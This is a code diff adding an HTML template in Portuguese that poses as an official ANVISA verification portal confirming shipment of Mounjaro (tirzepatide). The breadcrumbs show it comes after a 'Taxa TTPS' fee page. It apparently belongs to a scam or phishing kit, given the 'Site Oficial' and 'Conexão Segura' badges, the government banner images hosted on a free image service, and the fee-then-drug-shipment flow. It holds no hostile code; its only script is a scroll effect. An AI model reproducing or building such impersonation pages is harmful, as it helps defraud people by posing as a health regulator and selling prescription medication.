@@ -1,0 +1,515 @@
+{% extends "base.html" %}
+
+{% block title %}Confirmação de Envio | ANVISA{% endblock %}
+
+{% block additional_styles %}
+.main-title {
+  font-size: 24px;
+  font-weight: 700;
+  color: #1351b4;
+  margin-bottom: 8px;
+}
+
+.subtitle {
+  font-size: 16px;
+  color: #666666;
+  margin-bottom: 24px;
+}
+
+.sticky-header {
+  position: sticky;
+  top: 0;
+  background-color: white;
+  z-index: 50;
+  transition: box-shadow 0.3s ease;
+}
+
+.sticky-header.shadow {
+  box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+}
+
+.secure-badge {
+  display: inline-flex;
+  align-items: center;
+  background-color: #f0f7ff;
+  color: #1351b4;
+  padding: 6px 12px;
+  border-radius: 16px;
+  font-size: 12px;
+  font-weight: 600;
+}
+
+.secure-badge i {
+  margin-right: 4px;
+}
+
+.confirmation-container {
+  background-color: white;
+  border-radius: 12px;
+  box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+  overflow: hidden;
+  max-width: 700px;
+  margin: 0 auto;
+  text-align: center;
+}
+
+.confirmation-header {
+  background-color: #dcfce7;
+  padding: 20px;
+  border-bottom: 1px solid #bbf7d0;
+}
+
+.confirmation-content {
+  padding: 40px 30px;
+}
+
+.confirmation-icon {
+  width: 80px;
+  height: 80px;
+  background-color: #dcfce7;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0 auto 24px;
+}
+
+.confirmation-icon i {
+  font-size: 40px;
+  color: #16a34a;
+}
+
+.confirmation-title {
+  font-size: 24px;
+  font-weight: 700;
+  color: #16a34a;
+  margin-bottom: 12px;
+}
+
+.confirmation-subtitle {
+  font-size: 16px;
+  color: #4b5563;
+  margin-bottom: 24px;
+}
+
+.shipping-box {
+  background-color: #f9fafb;
+  border-radius: 8px;
+  padding: 20px;
+  margin-bottom: 24px;
+  border: 1px solid #e5e7eb;
+  text-align: left;
+}
+
+.shipping-title {
+  font-size: 18px;
+  font-weight: 600;
+  color: #1351b4;
+  margin-bottom: 16px;
+  display: flex;
+  align-items: center;
+}
+
+.shipping-title i {
+  margin-right: 10px;
+  color: #1351b4;
+}
+
+.shipping-info {
+  color: #4b5563;
+  font-size: 14px;
+  line-height: 1.6;
+}
+
+.shipping-options {
+  margin-top: 16px;
+  border-top: 1px solid #e5e7eb;
+  padding-top: 16px;
+}
+
+.shipping-option {
+  display: flex;
+  padding: 12px;
+  border: 1px solid #e5e7eb;
+  border-radius: 8px;
+  margin-bottom: 12px;
+  align-items: center;
+}
+
+.shipping-icon {
+  width: 40px;
+  height: 40px;
+  background-color: #eff6ff;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-right: 12px;
+  flex-shrink: 0;
+}
+
+.shipping-icon i {
+  font-size: 20px;
+  color: #1351b4;
+}
+
+.shipping-details {
+  flex: 1;
+}
+
+.shipping-name {
+  font-weight: 600;
+  color: #1f2937;
+  font-size: 14px;
+  margin-bottom: 4px;
+}
+
+.shipping-time {
+  color: #4b5563;
+  font-size: 12px;
+}
+
+.shipping-price {
+  font-weight: 600;
+  color: #16a34a;
+  font-size: 14px;
+  margin-left: 12px;
+}
+
+.info-box {
+  background-color: #eff6ff;
+  border-radius: 8px;
+  padding: 16px;
+  margin-bottom: 24px;
+  border: 1px solid #bfdbfe;
+  border-left: 4px solid #3b82f6;
+  text-align: left;
+}
+
+.info-title {
+  font-size: 16px;
+  font-weight: 600;
+  color: #1351b4;
+  margin-bottom: 8px;
+  display: flex;
+  align-items: center;
+}
+
+.info-title i {
+  margin-right: 8px;
+  color: #3b82f6;
+}
+
+.info-text {
+  font-size: 14px;
+  color: #4b5563;
+  line-height: 1.5;
+}
+
+.btn {
+  padding: 12px 20px;
+  border-radius: 6px;
+  font-weight: 600;
+  font-size: 16px;
+  transition: all 0.2s ease;
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+}
+
+.btn-primary {
+  background-color: #1351b4;
+  color: white;
+  border: none;
+}
+
+.btn-primary:hover {
+  background-color: #0c3d8a;
+}
+
+.btn i {
+  margin-right: 8px;
+}
+
+.vlibras-icon {
+  position: fixed;
+  right: 10px;
+  top: 50%;
+  transform: translateY(-50%);
+  z-index: 1000;
+}
+
+.track-box {
+  background-color: #f0f9ff;
+  border-radius: 8px;
+  padding: 20px;
+  margin-bottom: 24px;
+  border: 1px solid #bae6fd;
+  border-left: 4px solid #0ea5e9;
+  text-align: left;
+}
+
+.track-title {
+  font-size: 16px;
+  font-weight: 600;
+  color: #0369a1;
+  margin-bottom: 8px;
+  display: flex;
+  align-items: center;
+}
+
+.track-title i {
+  margin-right: 8px;
+  color: #0ea5e9;
+}
+
+.track-code {
+  font-family: monospace;
+  font-size: 16px;
+  font-weight: 600;
+  color: #0c4a6e;
+  background-color: #e0f2fe;
+  padding: 8px 12px;
+  border-radius: 4px;
+  margin: 12px 0;
+  display: inline-block;
+}
+
+.track-status {
+  display: flex;
+  margin-top: 16px;
+}
+
+.status-bar {
+  display: flex;
+  flex: 1;
+  justify-content: space-between;
+  position: relative;
+  margin-top: 30px;
+}
+
+.status-bar::before {
+  content: '';
+  position: absolute;
+  top: 8px;
+  left: 0;
+  right: 0;
+  height: 4px;
+  background-color: #e5e7eb;
+  z-index: 1;
+}
+
+.status-step {
+  position: relative;
+  z-index: 2;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  width: 100px;
+}
+
+.status-point {
+  width: 20px;
+  height: 20px;
+  border-radius: 50%;
+  background-color: #e5e7eb;
+  margin-bottom: 8px;
+}
+
+.status-step.active .status-point,
+.status-step.completed .status-point {
+  background-color: #0ea5e9;
+}
+
+.status-step.completed ~ .status-step.completed::before,
+.status-step.completed ~ .status-step.active::before,
+.status-step.active ~ .status-step.active::before {
+  background-color: #0ea5e9;
+}
+
+.status-label {
+  font-size: 12px;
+  color: #4b5563;
+  text-align: center;
+}
+
+.status-step.active .status-label,
+.status-step.completed .status-label {
+  color: #0c4a6e;
+  font-weight: 600;
+}
+{% endblock %}
+
+{% block content %}
+  <img src="https://i.ibb.co/btmZWCB/IMG-3113.jpg" alt="Government header" class="w-screen">
+  <div class="sticky-header">
+    <div class="container mx-auto px-4 border-b border-[#0000001a]">
+      <div class="flex items-center justify-between py-2">
+        <div class="flex items-center">
+          <i class="fas fa-bars text-sm text-[#1451B4] mr-4 relative -top-1"></i>
+          <p class="text-[14px] text-[#333333] -ml-[5px] leading-tight">
+            Centro de Verificação Digital | ANVISA
+          </p>
+        </div>
+        <div class="flex items-center space-x-4">
+          <i class="fas fa-shield-alt text-sm text-green-600 relative -top-1"></i>
+          <i class="fas fa-lock text-sm text-green-600 relative -top-1"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <div class="container mx-auto px-4">
+    <div class="py-4">
+      <div class="flex items-center space-x-2 text-[13px]">
+        <a class="text-[#1451B4]" href="#"><i class="fas fa-home text-sm text-[#1451B4]"></i></a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <a class="text-[#1451B4]" href="#">Portal Cidadão</a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <a class="text-[#1451B4]" href="/ttps">Taxa TTPS</a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <a class="text-[#1451B4]" href="/ttps_sucesso">Registro Concluído</a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <span class="font-bold">Confirmação de Envio</span>
+      </div>
+    </div>
+  </div>
+
+  <main class="max-w-3xl mx-auto px-4 py-6">
+    <div class="mb-6">
+      <h2 class="main-title">
+        Confirmação de Envio do Medicamento
+      </h2>
+      <p class="subtitle">
+        Informações sobre o envio do seu medicamento Mounjaro (Tirzepatida)
+      </p>
+    </div>
+    
+    <div class="flex flex-wrap justify-center gap-3 my-4">
+      <span class="secure-badge"><i class="fas fa-shield-alt"></i> Site Oficial</span>
+      <span class="secure-badge"><i class="fas fa-lock"></i> Conexão Segura</span>
+      <span class="secure-badge"><i class="fas fa-truck"></i> Envio Confirmado</span>
+    </div>
+    
+    <div class="confirmation-container">
+      <div class="confirmation-header">
+        <h3 class="text-lg font-semibold text-[#166534]">Medicamento a Caminho</h3>
+      </div>
+      
+      <div class="confirmation-content">
+        <div class="confirmation-icon">
+          <i class="fas fa-truck"></i>
+        </div>
+        
+        <h2 class="confirmation-title">Seu Pedido foi Processado!</h2>
+        <p class="confirmation-subtitle">O medicamento Mounjaro (Tirzepatida) 5mg será enviado em breve para o endereço cadastrado.</p>
+        
+        <div class="shipping-box">
+          <h4 class="shipping-title">
+            <i class="fas fa-shipping-fast"></i>Informações de Envio
+          </h4>
+          
+          <p class="shipping-info">
+            Seu medicamento será enviado em <strong>3 a 7 dias úteis</strong>, dependendo do método de envio escolhido e disponibilidade em estoque.
+          </p>
+          
+          <div class="shipping-options">
+            <div class="shipping-option">
+              <div class="shipping-icon">
+                <i class="fas fa-truck"></i>
+              </div>
+              <div class="shipping-details">
+                <div class="shipping-name">Entrega Standard</div>
+                <div class="shipping-time">5-7 dias úteis</div>
+              </div>
+              <div class="shipping-price">Grátis</div>
+            </div>
+            
+            <div class="shipping-option">
+              <div class="shipping-icon">
+                <i class="fas fa-bolt"></i>
+              </div>
+              <div class="shipping-details">
+                <div class="shipping-name">Entrega Expressa</div>
+                <div class="shipping-time">3-4 dias úteis</div>
+              </div>
+              <div class="shipping-price">Disponível mediante consulta</div>
+            </div>
+          </div>
+        </div>
+        
+        <div class="track-box">
+          <h4 class="track-title">
+            <i class="fas fa-map-marker-alt"></i>Rastreamento do Pedido
+          </h4>
+          
+          <p>Você receberá o código de rastreamento por e-mail e SMS assim que o medicamento for despachado.</p>
+          
+          <div class="track-status">
+            <div class="status-bar">
+              <div class="status-step completed">
+                <div class="status-point"></div>
+                <div class="status-label">Pedido Confirmado</div>
+              </div>
+              
+              <div class="status-step active">
+                <div class="status-point"></div>
+                <div class="status-label">Em Preparação</div>
+              </div>
+              
+              <div class="status-step">
+                <div class="status-point"></div>
+                <div class="status-label">Enviado</div>
+              </div>
+              
+              <div class="status-step">
+                <div class="status-point"></div>
+                <div class="status-label">Entregue</div>
+              </div>
+            </div>
+          </div>
+        </div>
+        
+        <div class="info-box">
+          <h4 class="info-title">
+            <i class="fas fa-info-circle"></i> Informações Importantes
+          </h4>
+          <p class="info-text">
+            O medicamento Mounjaro (Tirzepatida) 5mg deve ser armazenado sob refrigeração (2°C a 8°C). Nosso envio inclui embalagem térmica especial para garantir a integridade do produto durante o transporte. Ao receber, verifique se a embalagem está intacta e armazene imediatamente na geladeira.
+          </p>
+        </div>
+        
+        <div class="flex justify-center mt-6">
+          <a href="/" class="btn btn-primary">
+            <i class="fas fa-home"></i> Voltar ao Início
+          </a>
+        </div>
+      </div>
+    </div>
+  </main>
+  
+  <div class="w-full mt-6">
+    <img src="https://i.ibb.co/DHjL5PHX/IMG-3117.jpg" alt="Imagem de rodapé do site" class="w-full">
+  </div>
+  
+  <a href="#" class="vlibras-icon">
+    <img src="https://cdn.jsdelivr.net/gh/spbgovbr-vlibras/vlibras-portal@dev/app/assets/access_icon.svg" alt="Ícone de acessibilidade em Libras" class="w-10 h-10">
+  </a>
+{% endblock %}
+
+{% block footer_scripts %}
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    // Efeito de scroll na barra de navegação
+    window.addEventListener('scroll', function() {
+      var header = document.querySelector('.sticky-header');
+      if (window.pageYOffset > 0) {
+        header.classList.add('shadow');
+      } else {
+        header.classList.remove('shadow');
+      }
+    });
+  });
+</script>
+{% endblock %}
